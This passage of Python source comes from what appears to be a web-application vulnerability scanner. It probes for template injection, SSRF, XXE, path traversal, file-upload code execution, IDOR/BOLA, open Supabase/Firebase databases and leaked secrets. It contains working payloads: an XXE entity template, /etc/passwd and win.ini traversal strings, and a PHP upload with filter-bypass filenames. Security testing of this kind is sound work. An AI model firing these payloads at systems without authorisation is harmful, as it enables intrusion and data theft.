                        if detect in _xss_send(c, method, action, data).text:
                            ctx.evidence.update(injectable=True, target=action, field=field)
                            return True  # 7*7 was evaluated server-side -> template/code injection
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if budget <= 0:
                    break
            if budget <= 0:
                break
    ctx.evidence.update(injectable=False, fields_tested=len(fields_seen), expr_shapes=len(_SSTI_EXPRS))
    return False if tested else None


# SSRF + XXE — both detected OUT-OF-BAND via a collaborator listener: inject a unique URL/entity that
# points back at the runner; a callback proves the target's SERVER made the request. Near-zero false
# positives (a random one-time URL is only fetched if the server actually requested it).
def _await_callback(collab, tokens, probe, timeout=2.5):
    deadline = time.perf_counter() + probe.probe.get("oob_wait", timeout)
    while time.perf_counter() < deadline:
        if any(collab.received(t) for t in tokens):
            return
        time.sleep(0.2)


_SSRF_PARAMS = ("url", "uri", "link", "src", "href", "callback", "webhook", "target", "host", "domain",
                "site", "feed", "proxy", "fetch", "load", "image", "img", "resource", "dest", "to",
                "out", "open", "page", "path", "data", "ref", "u", "server", "remote")


def ssrf(ctx, probe) -> bool | None:
    """Server-Side Request Forgery: inject a unique collaborator URL into URL-ish params (url/uri/link/
    image/...); a callback to the listener proves the server fetched it. N/A when no URL-ish param."""
    targets = []
    for f in ctx.profile.forms:
        fields = [x for x in f.fields if x.lower() in _SSRF_PARAMS]
        if fields:
            targets.append((f.action, (f.method or "get").lower(), fields, list(f.fields)))
    for e in ctx.profile.endpoints:
        if e.method.lower() == "get":
            fields = [x for x in e.query_params if x.lower() in _SSRF_PARAMS]
            if fields:
                targets.append((e.raw_path, "get", fields, list(e.query_params)))
    if not targets:
        return None
    hosts = oob.callback_hosts()
    collab = oob.Collaborator()
    tokens: list[str] = []
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
            for action, method, url_fields, all_fields in targets:
                for field in url_fields:
                    for host in hosts:
                        token = "hlssrf" + secrets.token_hex(5)
                        tokens.append(token)
                        data = {fn: (collab.url(host, token) if fn == field else _XSS_FILLER) for fn in all_fields}
                        try:
                            _xss_send(c, method, action, data)
                        except (httpx.HTTPError, httpx.InvalidURL):
                            continue
        _await_callback(collab, tokens, probe)
        fired = any(collab.received(t) for t in tokens)
        ctx.evidence.update(callback_received=fired, url_params=sorted({f for _, _, uf, _ in targets for f in uf}),
                            probes_sent=len(tokens))
        return True if fired else False
    finally:
        collab.close()


_XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]><r>&xxe;</r>'


def xxe(ctx, probe) -> bool | None:
    """XML External Entity: POST XML declaring an external entity pointing at the collaborator to each
    POST endpoint; a callback proves the parser resolved it. N/A when there's no POST endpoint."""
    posts = list(dict.fromkeys(
        [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
        + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
    if not posts:
        return None
    hosts = oob.callback_hosts()
    collab = oob.Collaborator()
    tokens: list[str] = []
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
            for action in posts:
                for host in hosts:
                    token = "hlxxe" + secrets.token_hex(5)
                    tokens.append(token)
                    xml = (_XXE_PAYLOAD % collab.url(host, token)).encode()
                    for ctype in ("application/xml", "text/xml"):
                        try:
                            c.post(action, content=xml, headers={"Content-Type": ctype})
                        except (httpx.HTTPError, httpx.InvalidURL):
                            continue
        _await_callback(collab, tokens, probe)
        fired = any(collab.received(t) for t in tokens)
        ctx.evidence.update(callback_received=fired, post_endpoints=len(posts), probes_sent=len(tokens))
        return True if fired else False
    finally:
        collab.close()


# Path traversal / local file inclusion — read a file outside the intended directory via a filename
# param. Comprehensive: absolute paths, ../ traversal (raw / doubled / URL-encoded), null-byte, php://
# wrapper; Unix (/etc/passwd) + Windows (win.ini). Detection = the target file's unmistakable content
# signature, which reflecting the path string can never produce -> precise.
# TIGHT: the passwd root line is `root:<pw>:0:0:` where <pw> is a SHORT placeholder (x/*/!/empty), never
# arbitrary text — the old `root:.*?:0:0:` matched a spurious `root:`…`:0:0:` span across ONE line of a
# minified JS bundle (a real arcgis-core-*.js false-fired at penalty 40). Bounding the middle + dropping
# the bare `[fonts]`/`[extensions]` win.ini headers (common substrings in JS/CSS config blobs) keeps only
# unmistakable signatures; win.ini stays via its distinctive 16-bit comment.
_LFI_SIG = re.compile(r"root:[^:\r\n]{0,8}:0:0:|for 16-bit app support", re.IGNORECASE)
_LFI_PARAMS = ("page", "file", "path", "include", "template", "doc", "filename", "load", "view", "dir")
_INCLUDABLE = re.compile(r"fi|includ|file|page|view|download|load|template|doc|read|show", re.IGNORECASE)
_LFI_PAYLOADS = (
    "/etc/passwd", "../../../../../../../etc/passwd", "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00", "../../../../etc/passwd%00.png",
    "C:\\Windows\\win.ini", "..\\..\\..\\..\\..\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
)


def path_traversal(ctx, probe) -> bool | None:
    """Path traversal / LFI across forms, discovered query params, and common filename params on
    includable-looking GET routes. Injects absolute / relative / encoded / null-byte / php-wrapper
    payloads for /etc/passwd and win.ini; fires on the file's content signature. N/A when no surface."""
    # LFI is a GET-filename vuln -> test query params + includable routes FIRST, forms last, so a large
    # form set can't exhaust the budget before the real vector (a ?page=/?file=) is reached.
    q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
         if e.method.lower() == "get" and e.query_params]
    incl = [(rt, "get", list(_LFI_PARAMS)) for rt in ctx.profile.routes if _INCLUDABLE.search(rt)]
    forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
    targets = q + incl + forms
    if not targets:
        return None
    budget = probe.probe.get("max_attempts", 200)
    tested = False
    fields_seen = set()
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
        for action, method, fields in targets:
            for field in fields:
                for payload in _LFI_PAYLOADS:
                    if budget <= 0:
                        break
                    budget -= 1
                    tested = True
                    fields_seen.add((action, field))
                    data = {fn: (payload if fn == field else _XSS_FILLER) for fn in fields}
                    try:
                        r = _xss_send(c, method, action, data)
                        ct = r.headers.get("content-type", "").lower()
                        # a served /etc/passwd or win.ini is text/plain or octet-stream, NEVER the app's own
                        # bundle — skip js/css so a signature can't match noise inside a minified script.
                        if "javascript" in ct or "css" in ct:
                            continue
                        if _LFI_SIG.search(r.text):
                            ctx.evidence.update(found=True, target=action, field=field)
                            return True  # returned the contents of a system file -> traversal/LFI
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
                if budget <= 0:
                    break
            if budget <= 0:
                break
    ctx.evidence.update(found=False, fields_tested=len(fields_seen), payloads=len(_LFI_PAYLOADS))
    return False if tested else None


# Insecure file upload — comprehensive filter-bypass coverage: a PHP webshell accepted despite
# extension / content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The
# payload echoes an arithmetic expression (hlup + 7*7 -> "hlup49x"); "hlup49x" in the FETCHED file
# proves server-side execution (the stored SOURCE shows "(7*7)", never "49") -> RCE, not mere storage.
_UPLOAD_MARK = "hlup49x"
_UPLOAD_PHP = b"<?php echo 'hlup'.(7*7).'x'; ?>"
_GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
_UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "file/", "images/", "img/", "media/",
                "hackable/uploads/", "assets/uploads/", "static/uploads/", "tmp/", "data/uploads/")


def _upload_variants():
    """(filename, content_type, body) across the standard upload-filter bypasses."""
    return [
        ("hlshell.php", "application/x-php", _UPLOAD_PHP),                # unrestricted
        ("hlshell.php", "image/jpeg", _UPLOAD_PHP),                      # content-type spoof
        ("hlshell.jpg.php", "image/jpeg", _UPLOAD_PHP),                  # double extension
        ("hlshell.php.jpg", "image/jpeg", _UPLOAD_PHP),                  # trailing extension
        ("hlshell.phtml", "image/jpeg", _UPLOAD_PHP),                    # alternate PHP extension
        ("hlshell.php\x00.jpg", "image/jpeg", _UPLOAD_PHP),             # null-byte truncation
        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + _UPLOAD_PHP),  # magic-byte spoof + PHP
    ]


def _locate_upload(resp_text: str, filename: str) -> list[str]:
    """Candidate URLs for the just-uploaded file: any path in the response naming it, then common
    upload directories."""
    base = filename.split("\x00")[0].split("/")[-1]
    urls = ["/" + m.lstrip("./").lstrip("/")
            for m in re.findall(r"[\w./-]*" + re.escape(base), resp_text)]
    urls += ["/" + d + base for d in _UPLOAD_DIRS]
    return list(dict.fromkeys(urls))


def file_upload(ctx, probe) -> bool | None:
    """Insecure file upload across multipart forms with a file field: upload a PHP webshell in several
    filter-bypass shapes, locate it (from the response or common upload dirs), fetch it, and fire when
    it EXECUTES (arithmetic marker). N/A when there's no file-upload form."""
    forms = [f for f in ctx.profile.forms if f.file_fields]
    if not forms:
        return None
    tested = False
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        for f in forms:
            for filename, ctype, body in _upload_variants():
                tested = True
                files = {ff: (filename, body, ctype) for ff in f.file_fields}
                data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
                try:
                    resp = c.request((f.method or "post").upper(), f.action, files=files, data=data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for url in _locate_upload(resp.text, filename):
                    try:
                        if _UPLOAD_MARK in c.get(url).text:
                            ctx.evidence.update(rce=True, form=f.action, filename=filename)
                            return True  # the uploaded PHP executed server-side -> RCE via upload
                    except (httpx.HTTPError, httpx.InvalidURL):
                        continue
    ctx.evidence.update(rce=False, forms=len(forms), variants=len(_upload_variants()))
    return False if tested else None


# API BOLA / horizontal IDOR (OWASP API-Security #1): an object created by user A is readable by
# user B. Verified with a planted canary — B's read must return A's SECRET value (not just a 2xx, and
# not the id A chose, which legitimately echoes back), so a token-scoped or no-op endpoint can't false
# -positive. Guarded on the read being auth-gated (unauth -> 401/403), so a public endpoint isn't BOLA.
def _bola_pairs(endpoints):
    """(create, read, param, id_field) tuples: a POST-with-body create paired with a GET read whose
    single path param sits on the same collection. id_field = the create body field that supplies the
    id (when the path param names one), else None (the id comes from the create response)."""
    creates = [e for e in endpoints if e.method.lower() == "post" and e.body_fields]
    pairs = []
    for r in endpoints:
        if r.method.lower() != "get" or len(r.path_params) != 1:
            continue
        param = r.path_params[0]
        collection = r.raw_path.rsplit("/", 1)[0]
        if r.raw_path != collection + "/{" + param + "}":
            continue  # param must be the final path segment (a resource id), not mid-path
        for c in creates:
            if c.raw_path.rstrip("/") == collection:
                pairs.append((c, r, param, param if param in c.body_fields else None))
    return pairs


def _created_id(resp):
    """The id of a just-created object: a Location header tail, or an id-like field in the JSON body."""
    loc = resp.headers.get("location")
    if loc:
        return loc.rstrip("/").rsplit("/", 1)[-1]
    try:
        data = resp.json()
    except (ValueError, httpx.HTTPError):
        return None
    candidates = [data] + ([v for v in data.values() if isinstance(v, dict)] if isinstance(data, dict) else [])
    for node in candidates:
        if isinstance(node, dict):
            for k in ("id", "_id", "uuid", "slug"):
                if isinstance(node.get(k), (str, int)):
                    return node[k]
    return None


# A cross-user-readable object is only unambiguous slop when it carries an INHERENTLY private field —
# a shared catalog is also readable by everyone but isn't a vuln (that's intent, which humans judge).
# Gating on a sensitive field name keeps this intent-independent: a secret/credential/PII exposed to
# another account is wrong regardless of the app's intent.
_SENSITIVE_FIELD = re.compile(
    r"secret|password|passwd|apikey|api_key|private|token|ssn|social_security|"
    r"credit_?card|card_?number|cvv|iban|passport", re.IGNORECASE)


_NA_TWO_ACCT = ("couldn't establish two independent accounts to compare — self-serve signup isn't reachable "
                "black-box (SDK/client-side auth, email confirmation, or captcha)")
_NA_PROVIDED = "a single provided --header session is one identity — can't act as two different users"


def _two_accounts(ctx):
    """Register two independent accounts (A, B) for a cross-user authorization probe (IDOR/BOLA). Returns
    (a, b), or (None, None) with an na_reason set on the evidence. The corpus wall these probes hit: on an
    SDK-auth SPA a second confirmed identity usually can't be minted black-box, so a cross-user read can't
    be PROVEN — the probe is then honestly N/A (with a reason) rather than guessing a finding."""
    a = ctx.register(suffix="_a")
    b = ctx.register(suffix="_b")
    if a is None or b is None:
        for acct in (a, b):
            if acct:
                acct.client.close()
        ctx.evidence["na_reason"] = _NA_TWO_ACCT
        return None, None
    if a.provided:   # a single --header session is ONE identity -> B == A -> not a cross-user read
        a.client.close()
        b.client.close()
        ctx.evidence["na_reason"] = _NA_PROVIDED
        return None, None
    return a, b


def api_bola(ctx, probe) -> bool | None:
    """Register two accounts A and B; A creates an object whose sensitive field carries a canary; if B
    can read that object and sees A's canary, object-level authorization is broken. Only pairs whose
    create body has a sensitive field are tested (precision — a shared collection isn't BOLA). N/A when
    there's no such pair or two accounts can't be established."""
    pairs = [(c, r, p, idf) for (c, r, p, idf) in _bola_pairs(ctx.profile.endpoints)
             if any(_SENSITIVE_FIELD.search(f) for f in c.body_fields)]
    if not pairs:
        ctx.evidence["na_reason"] = "no create+read API pair with a private field to cross-check"
        return None  # no create+read pair with a private field to exercise -> couldn't test
    a, b = _two_accounts(ctx)
    if a is None:
        return None   # couldn't mint two accounts (na_reason set) -> couldn't test
    tested = False
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as anon:
            for create_ep, read_ep, param, id_field in pairs:
                id_value = "hlbola" + secrets.token_hex(4)
                secret_value = "hlsecret" + secrets.token_hex(6)
                # canary only in the sensitive field(s); id field gets the id; others a benign filler
                body = {f: (id_value if f == id_field else
                            secret_value if _SENSITIVE_FIELD.search(f) else "hlfill" + secrets.token_hex(3))
                        for f in create_ep.body_fields}
                try:
                    created = a.client.post(create_ep.path, json=body)
                    if created.status_code not in (200, 201):
                        continue
                    obj_id = id_value if id_field else _created_id(created)
                    if obj_id in (None, ""):
                        continue
                    read_path = read_ep.raw_path.replace(
                        "{" + param + "}", urllib.parse.quote(str(obj_id), safe=""))
                    if anon.get(read_path).status_code not in (401, 403):
                        continue  # read isn't auth-gated -> a public endpoint, not a BOLA
                    tested = True
                    b_read = b.client.get(read_path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if b_read.status_code == 200 and secret_value in b_read.text:
                    ctx.evidence.update(cross_read=True, endpoint=read_path)
                    return True  # B read A's object AND saw A's planted secret -> broken object auth
        ctx.evidence.update(cross_read=False, pairs_tested=len(pairs))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


def idor_user_record(ctx, probe) -> bool | None:
    """Horizontal IDOR on a USER/ACCOUNT record — the canonical '/user/123 -> /user/124' case, read-only.
    Register two accounts A and B, then check whether B can read A's OWN account record by id. A's record id is
    A's session subject (the JWT `sub` the app itself assigned — how it keys per-user rows); A's registration
    username is the unambiguous canary (unique to A, stored in its record). Fire only when (1) the id-addressed
    read returns A's canary AS A [it really is A's private record], (2) an anonymous client CANNOT read it [it's
    access-gated, not public], and (3) the SAME read returns A's canary AS B [a second logged-in user reads it
    -> broken object-level authorization]. N/A when two distinct accounts can't be established, A has no
    addressable id (cookie session with no JWT), or no id-addressed endpoint returns A's own record."""
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    try:
        a_id = auth.session_subject(a)
        canary = a.username                        # unique per-registration token, stored in A's own record
        if not a_id or not canary:
            ctx.evidence["na_reason"] = "account A has no addressable user id (cookie session, no JWT subject)"
            return None                            # no addressable user id (cookie session) -> couldn't test
        reads = [(e, e.path_params[0]) for e in ctx.profile.endpoints
                 if e.method.lower() == "get" and len(e.path_params) == 1
                 and e.raw_path.endswith("/{" + e.path_params[0] + "}")]
        if not reads:
            ctx.evidence["na_reason"] = "no id-addressed record endpoint (GET /{id}) served same-origin"
            return None
        tested = False
        with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as anon:
            for e, param in reads:
                path = e.raw_path.replace("{" + param + "}", urllib.parse.quote(a_id, safe=""))
                try:
                    as_a = a.client.get(path)
                    if as_a.status_code != 200 or canary not in as_a.text:
                        continue                   # id isn't a user id at this endpoint -> not A's record here
                    if anon.get(path).status_code not in (401, 403):
                        continue                   # readable anonymously -> a public record, not IDOR
                    tested = True
                    as_b = b.client.get(path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if as_b.status_code == 200 and canary in as_b.text:
                    ctx.evidence.update(cross_read=True, endpoint=path)
                    return True                    # B read A's own account record -> horizontal IDOR
        ctx.evidence.update(cross_read=False, reads_tested=len(reads))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


_BACKEND_READ_CAP = 8


def bola_managed_backend(ctx, probe) -> bool | None:
    """Horizontal IDOR / broken Row-Level-Security on the app's MANAGED backend (Supabase). A bolt/Supabase app
    talks straight to <project>.supabase.co, so its data authorization IS the developer's RLS config — part of
    the submission, not the vendor's platform. We test ONLY that config, never Supabase itself: replay the app's
    OWN observed /rest/v1 reads (captured during A's registration), as a SECOND registered user B, using the
    app's OWN public apikey. Read-only, only the endpoints/project/key the app already uses.

    Fire when a read that returns A's record for A — and is NOT anon/world-readable (apikey alone; that's the
    separate sec-exposure finding) — ALSO returns A's record for B: a second user reads A's private row -> RLS
    is per-user broken. A's unique registration username is the oracle. N/A when no backend reads were observed
    (no --browser-auth, or a same-origin/cookie app) or two distinct accounts can't be established."""
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    try:
        canary = a.username
        a_auth = a.client.headers.get("Authorization")
        b_auth = b.client.headers.get("Authorization")
        reads = getattr(a, "backend_reads", None) or []
        if not reads or not canary or not a_auth or not b_auth:
            ctx.evidence["na_reason"] = "no managed-backend (Supabase) reads captured to replay (needs --browser-auth)"
            return None
        tested = False
        with httpx.Client(timeout=10.0, follow_redirects=True) as c:
            for r in reads[:_BACKEND_READ_CAP]:
                url, apikey = r.get("url"), r.get("apikey")
                if not url:
                    continue
                base = {"apikey": apikey} if apikey else {}
                try:
                    as_a = c.get(url, headers={**base, "Authorization": a_auth})
                    if as_a.status_code != 200 or canary not in as_a.text:
                        continue   # this read doesn't return A's own record -> nothing to cross-check
                    if canary in c.get(url, headers=base).text:
                        continue   # readable with the apikey ALONE -> world-readable (sec-exposure), not per-user IDOR
                    tested = True
                    as_b = c.get(url, headers={**base, "Authorization": b_auth})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if as_b.status_code == 200 and canary in as_b.text:
                    ctx.evidence.update(cross_read=True, endpoint=url.split("?")[0])
                    return True   # B read A's private backend record -> broken per-user RLS
        ctx.evidence.update(cross_read=False, reads_tested=len(reads))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


def data_integrity_roundtrip(ctx, probe) -> bool | None:
    """Persistence correctness: POST-create an object, then read it back by id and confirm the write was
    durable. Fire when a create reports success (2xx with an id) but the object then can't be read back
    (404 / 410 / 5xx) -> silent data loss / non-durable writes (the 'it said it saved, but it's gone'
    failure). Uses the same create+read pairing as BOLA. N/A when there's no create+read pair or no
    create succeeds (couldn't establish the round-trip -> not a clean pass, a missed test)."""
    pairs = _bola_pairs(ctx.profile.endpoints)
    if not pairs:
        ctx.evidence["na_reason"] = "no create+read endpoint pair to round-trip (SPA writes go off-origin)"
        return None
    account = ctx.register()   # some creates are auth-gated
    client = (account.client if account
              else make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True))
    tested = False
    try:
        for create_ep, read_ep, param, id_field in pairs:
            chosen_id = "hlid" + secrets.token_hex(4)
            marker = "hldi" + secrets.token_hex(6)
            body = {f: (chosen_id if f == id_field else marker + secrets.token_hex(2))
                    for f in create_ep.body_fields}
            try:
                created = client.post(create_ep.path, json=body)
                if created.status_code not in (200, 201):
                    continue  # create didn't succeed -> nothing to read back on this pair
                obj_id = chosen_id if id_field else _created_id(created)
                if obj_id in (None, ""):
                    continue  # created but no id to address it by -> can't round-trip this pair
                read_path = read_ep.raw_path.replace(
                    "{" + param + "}", urllib.parse.quote(str(obj_id), safe=""))
                read = client.get(read_path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            tested = True
            if read.status_code in (404, 410) or read.status_code >= 500:
                ctx.evidence.update(create_status=created.status_code, read_status=read.status_code,
                                    endpoint=read_path, durable=False)
                return True  # server acknowledged the create but the object isn't readable -> data lost
        if not tested:
            ctx.evidence["na_reason"] = "no create endpoint accepted a write to read back"
            return None
        ctx.evidence.update(tested=tested, durable=True)
        return False
    finally:
        client.close()


def _declared_type_contradicted(ctype: str, body: str) -> str | None:
    """Does the body's actual format contradict its declared Content-Type? Returns a short reason for the
    unambiguous, harmful cases only, else None. The headline case is JSON served as text/html: a browser
    may render/execute it (a reflected-JSON XSS vector) and strict JSON clients break on the wrong type."""
    ct = (ctype or "").split(";", 1)[0].strip().lower()
    s = body.lstrip()
    if not s:
        return None
    looks_json = s[0] in "{[" and _is_json(body)
    low = s.lower()
    looks_html = low.startswith("<!doctype") or low.startswith("<html")
    if looks_json and ct in ("text/html", "application/xhtml+xml"):
        return "json-body-served-as-text/html"
    if looks_html and ct == "application/json":
        return "html-body-served-as-application/json"
    return None


def _is_json(body: str) -> bool:
    try:
        json.loads(body)
        return True
    except (ValueError, TypeError):
        return False


def content_type_mismatch(ctx, probe) -> bool | None:
    """Do any responses declare a Content-Type their body contradicts? Fetches the safe no-path-param GET
    endpoints (plus the homepage) and fires on an unambiguous mismatch -- above all JSON served as
    text/html (a browser may render it: a reflected-JSON XSS vector, and JSON clients break on the wrong
    type). N/A when no response returns a body we can classify (couldn't test)."""
    target = probe.probe.get("target", "/")
    seen, candidates = set(), []
    for path in [target] + [e.path for e in ctx.profile.endpoints
                            if e.method.lower() == "get" and not e.path_params]:
        if path not in seen and not seen.add(path):
            candidates.append(path)
    checked = False
    for path in candidates[:20]:   # cap the fan-out; the mismatch is a global habit, not per-route
        try:
            resp = ctx.client.get(path)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        if not resp.text.strip():
            continue
        checked = True
        reason = _declared_type_contradicted(resp.headers.get("content-type", ""), resp.text)
        if reason:
            ctx.evidence.update(endpoint=path, declared=resp.headers.get("content-type", ""), reason=reason)
            return True
    ctx.evidence.update(checked=checked)
    return False if checked else None


def debug_mode_enabled(ctx, probe) -> bool | None:
    """Framework debug mode shipped to production: an error surfaces the full interactive debugger /
    DEBUG page (Werkzeug, Django DEBUG=True, Rails Better Errors, Laravel Whoops), leaking source,
    settings and env -- and, for Werkzeug, an RCE console. Strictly worse than a bare leaked stack
    trace (qa-errhyg): this is the framework's debug UI. Scans errors induced across discovered endpoints
    (+ the /crash route) and probes for a live Werkzeug debugger resource. N/A when nothing was inspected."""
    inspected = False
    for r in _induce_error_responses(ctx):
        inspected = True
        if _DEBUG_FINGERPRINT.search(r.text):
            ctx.evidence.update(status=r.status_code, debug_ui=True)
            return True
    # Werkzeug/Flask debug ships an interactive debugger reachable WITHOUT an error: it serves its own JS
    # resource. A normal app 404s or returns HTML here; only a live debugger answers with javascript --
    # gating on the javascript content-type avoids false-firing on a 404 page that reflects the query.
    try:
        r = ctx.client.get("/", params={"__debugger__": "yes", "cmd": "resource", "f": "debugger.js"})
        inspected = True
        if (r.status_code == 200 and "javascript" in r.headers.get("content-type", "").lower()
                and "werkzeug" in r.text.lower()):
            ctx.evidence.update(endpoint="/?__debugger__=yes", debug_ui=True, framework="werkzeug")
            return True
    except (httpx.HTTPError, httpx.InvalidURL):
        pass
    ctx.evidence.update(inspected=inspected, debug_ui=False)
    return False if inspected else None


# --- managed-backend exposure (Supabase / Firebase shipped world-readable) --------------------------
# The signature vibe-coding leak: the app embeds a Supabase/Firebase config + its PUBLIC anon key in the
# client bundle, but ships the database with NO row-level security -> anyone with the (public) key reads
# the whole DB. We mine the bundle for the config, then issue the SAME read-only query the app's own
# frontend makes, with the SAME public key, and see whether real rows come back. Host-restricted to the
# managed providers (never an arbitrary URL from the bundle -> no SSRF), read-only, bounded.
_SUPABASE_URL = re.compile(r"https://([a-z0-9]{15,40})\.supabase\.co")
_FIREBASE_RTDB = re.compile(r"https://([a-z0-9][a-z0-9-]{2,60}\.firebaseio\.com)")
_JWT = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b")


def _client_bundle(ctx, cap: int = 2_000_000) -> str:
    """The served client-side text: the homepage plus its same-origin .js bundles, where an SPA embeds
    its backend config + public keys."""
    parts, total = [], 0
    paths = ["/"] + [r for r in ctx.profile.routes if r.split("?")[0].endswith(".js")]
    for p in list(dict.fromkeys(paths))[:10]:
        try:
            t = ctx.client.get(p).text
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        parts.append(t[:cap - total])
        total += len(parts[-1])
        if total >= cap:
            break
    return "\n".join(parts)


def bundle_leaks_secret(ctx, probe) -> bool | None:
    """SPA-native: mine the served CLIENT bundle (homepage + same-origin .js) for a hardcoded SECRET key that
    shipped to the browser — a SERVER key (Stripe sk_ / OpenAI / AWS secret / GitHub PAT / private key) in the
    bundle is account/DB takeover, the #1 real SPA leak. Public-by-design keys (Supabase anon / Firebase apiKey
    / Stripe pk_) are NOT in the pattern set (secretscan._PROVIDER), so they never fire. N/A when no bundle."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    kinds = secretscan.scan_blob(blob)
    if kinds:
        ctx.evidence.update(secret_kinds=kinds, source="client-bundle")
        return True
    ctx.evidence.update(secret_kinds=[], scanned_bytes=len(blob))
    return False


def vulnerable_dependency(ctx, probe) -> bool | None:
    """Supply-chain: the app SHIPS a client library with a KNOWN CVE (retire.js-style). Reads the app's OWN
    bundle (ETHICAL — their code, never a third party's server) and fingerprints a curated set by license-
    banner version. The team CHOSE the vulnerable dep (24h is enough for `npm audit`), so it's their finding,
    and the report's remediation teaches vendor due diligence by proxy. Precision-first (unambiguous banner +
    established CVE range). N/A when no bundle was served."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    vulns = depscan.scan_deps(blob)
    if vulns:
        ctx.evidence.update(vulnerable_deps=vulns, count=len(vulns))
        return True
    ctx.evidence.update(vulnerable_deps=[], scanned_bytes=len(blob))
    return False


_SOURCEMAP_URL = re.compile(r"//[#@]\s*sourceMappingURL=(\S+)")


def source_map_exposed(ctx, probe) -> bool | None:
    """SPA-native info-disclosure: a production bundle ships its .map, so anyone can reconstruct the ORIGINAL
    source — business logic, hidden endpoints, and (the real risk) hardcoded secrets a minified scan misses.
    For each same-origin .js bundle, fetch the //# sourceMappingURL target (or the conventional <bundle>.map);
    fire only on a REAL sourcemap (JSON with sources/sourcesContent), never a soft-404 shell (innocence check).
    N/A when there are no .js bundles to check."""
    js = [r for r in (["/"] + ctx.profile.routes) if r.split("?")[0].endswith(".js")]
    if not js:
        return None
    for path in list(dict.fromkeys(js))[:10]:
        try:
            m = _SOURCEMAP_URL.search(ctx.client.get(path).text)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        cand = m.group(1) if m else None
        for mp in [c for c in (cand, path + ".map") if c and not c.startswith(("http", "data:"))]:
            try:
                r = ctx.client.get(urllib.parse.urljoin(path, mp))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code != 200 or _is_phantom_shell(ctx, r):
                continue                      # not served, or a soft-404 shell
            try:
                sm = r.json()
            except ValueError:
                continue
            if isinstance(sm, dict) and sm.get("version") and ("sources" in sm or "sourcesContent" in sm):
                ctx.evidence.update(bundle=path, source_map=mp, sources=len(sm.get("sources") or []),
                                    reconstructable=bool(sm.get("sourcesContent")))
                return True
    return False


def _postgrest_tables(resp) -> list[str]:
    """Table names PostgREST advertises at its root for the anon role (the OpenAPI 'definitions')."""
    try:
        j = resp.json()
    except ValueError:
        return []
    if isinstance(j, dict) and isinstance(j.get("definitions"), dict):
        return list(j["definitions"].keys())
    if isinstance(j, dict) and isinstance(j.get("paths"), dict):
        return [p.strip("/") for p in j["paths"] if p.strip("/")]
    return []


def _supabase_readable(client, base: str, keys: list[str]):
    """Return {table, rows, sample} if any table returns rows to the anon key (RLS missing), 'unreachable'
    if the host can't be reached (egress blocked -> N/A), else None (reached but nothing readable)."""
    reached = False
    for key in keys[:4]:
        hdr = {"apikey": key, "Authorization": "Bearer " + key}
        try:
            root = client.get(base + "/rest/v1/", headers=hdr, timeout=6.0)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        reached = True
        for table in _postgrest_tables(root)[:8]:
            try:
                r = client.get(base + "/rest/v1/" + table, params={"select": "*", "limit": "1"},
                               headers=hdr, timeout=6.0)
                rows = r.json() if r.status_code == 200 else None
            except (httpx.HTTPError, httpx.InvalidURL, ValueError):
                continue
            if isinstance(rows, list) and rows:   # real rows to the public key -> world-readable DB
                return {"table": table, "rows": len(rows), "columns": sorted(rows[0])[:8]}
    return None if reached else "unreachable"


def _firebase_readable(client, json_url: str):
    """The whole Realtime Database if it's world-readable: GET <db>/.json returns data (not null / not a
    permission error). 'unreachable' on a network error (-> N/A)."""
    try:
        r = client.get(json_url, timeout=6.0)
    except (httpx.HTTPError, httpx.InvalidURL):
        return "unreachable"
    if r.status_code == 200:
        try:
            data = r.json()
        except ValueError:
            return None
        if data not in (None, {}, []):
            return data
    return None


def exposed_backend_readable(ctx, probe) -> bool | None:
    """Managed backend (Supabase/Firebase) shipped without row-level security: mine the client bundle for
    the config + public key, then read the DB with that key. Fire if real rows come back. N/A when no such
    config is embedded (the firewalled Tier-A case) or the provider host is unreachable (egress blocked)."""
    blob = _client_bundle(ctx)
    sm = _SUPABASE_URL.search(blob)
    fm = _FIREBASE_RTDB.search(blob)
    if not sm and not fm:
        return None  # no managed-backend config in the client -> nothing to test
    reached = False
    keys = [m.group(0) for m in _JWT.finditer(blob)]
